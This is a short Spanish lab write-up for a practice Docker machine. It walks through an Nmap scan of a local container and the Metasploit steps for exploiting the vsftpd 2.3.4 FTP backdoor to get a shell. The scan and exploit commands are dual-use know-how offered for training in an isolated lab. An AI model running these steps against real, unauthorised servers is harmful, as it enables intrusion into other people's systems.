# Laboratorio 1: FirstHacking

## Descripción
Este laboratorio consiste en explotar una vulnerabilidad en un servidor FTP utilizando Metasploit. El objetivo es obtener acceso a la máquina objetivo y realizar un análisis de vulnerabilidades.

## Pasos para la resolución

1. **Instalación de Docker y descarga del laboratorio:**
   - Instalar Docker en Kali Linux: `sudo apt install docker.io -y`.
   - Descargar el laboratorio desde MEGA y descomprimirlo.
     
![image](https://github.com/user-attachments/assets/911ffc18-fca4-4c5b-bb3b-81180f980092)


2. **Despliegue del laboratorio:**
   - Ejecutar el comando: `sudo bash auto_deploy.sh firsthacking.tar`.
   - Desconectar el equipo de internet para evitar problemas de seguridad.

![image](https://github.com/user-attachments/assets/8419e866-a4fc-417d-8891-efb2078ca7de)


3. **Reconocimiento:**
   - Verificar la conectividad con la máquina objetivo: `ping 172.17.0.2`.
   - Escanear la máquina con Nmap: `sudo nmap -p- -sS -sV -sC --open --min-rate=5000 -n -Pn 172.17.0.2 -vvv`.
  
    ![image](https://github.com/user-attachments/assets/8b8170ed-1f84-467a-8289-38e7e3879815)


4. **Explotación:**
   - Iniciar Metasploit: `msfconsole`.
   - Buscar el exploit para vsftpd 2.3.4: `search vsftpd 2.3.4`.
   - Seleccionar el exploit: `use 0`.
   - Configurar el exploit: `set RHOSTS 172.17.0.2`.
   - Ejecutar el exploit: `run`.

![image](https://github.com/user-attachments/assets/c7f088ea-aad3-4a5d-824a-daa2c93646a4)

![image](https://github.com/user-attachments/assets/9cd9a02b-30f6-4e97-bebc-a88937232520)

![image](https://github.com/user-attachments/assets/b1b9ae2d-703d-444e-981b-4b5f04dc941e)

![image](https://github.com/user-attachments/assets/b270daa2-355a-49a7-872a-1caa916878d5)v


5. **Post-explotación:**
   - Verificar el usuario actual: `whoami`.
   - Finalizar el laboratorio con `Ctrl + C`.

![image](https://github.com/user-attachments/assets/1fd37098-1270-4eb8-bfa2-25171c2afc3e)

## Conclusión
Se logró explotar con éxito la vulnerabilidad en el servidor FTP y obtener acceso a la máquina objetivo.
